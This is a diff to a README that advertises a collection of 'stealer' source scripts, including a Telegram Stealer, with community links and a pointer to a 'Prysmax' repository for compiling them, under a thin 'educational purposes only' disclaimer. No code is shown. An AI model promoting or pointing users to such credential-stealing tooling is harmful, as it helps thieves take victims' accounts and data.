@@ -1,9 +1,9 @@
 # MAKE U OWN STEALER - SOURCE SCRIPTS !! 🚀
 ## STARR FOR MORE UPDATES ❤️ 
-- 🌟 **Leave a star!!**
+- 🌟 If you want to compile your file go to the Prysmax repository and compile it for free and easy! - [Prysmax Compilator](https://github.com/Lawxsz/prysmax)
 - Discord: https://discord.gg/g69Bv8fB
-- Telegram: https://t.me/prysmax
-- 
+- Telegram: https://t.me/prysmax - https://t.me/lawxsz
+  
 This repository is for educational purposes only, we only provide Python Scripts so that you can use them in the purposes you need.
 # Features - Scripts
 - 🚀 Telegram Stealer 
